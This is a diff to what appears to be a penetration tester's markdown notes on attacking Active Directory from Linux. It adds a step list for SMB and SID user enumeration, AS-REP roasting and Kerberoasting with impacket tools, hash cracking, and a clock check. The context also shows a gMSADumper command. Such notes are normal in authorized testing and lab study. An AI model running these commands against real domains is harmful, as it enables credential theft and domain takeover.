@@ -1,3 +1,12 @@
+# example attack
+
+1. check smb if some generic user is allowed to access
+2. check sids for user list: impacket-lookupsid generic@$rhost
+3. AS_REP: impacket-GetNPUsers '$DOMAIN/' -usersfile users.txt -no-pass -dc-ip $rhost -outfile asrep.hash
+4. crack hash
+5. Kerberoasting (requires credentials) (can output hashes for new users): impacket-GetUserSPNs 'full.domain/some_user:some_password' -outputfile keberoast.hash -dc-ip $rhost
+6. crack hash
+
 # linux attacker
 
 ## enumerate LDAP
@@ -41,6 +50,12 @@ This can be used to get the kerberos hashes/tickets.
 python3 gMSADumper.py -u user_name -p user_password -d domain.tld
 ```
 # Kerberos
+
+## get time 
+
+```bash
+sudo ntpdate -q "$rhost"
+```
 
 ## Update clock
 
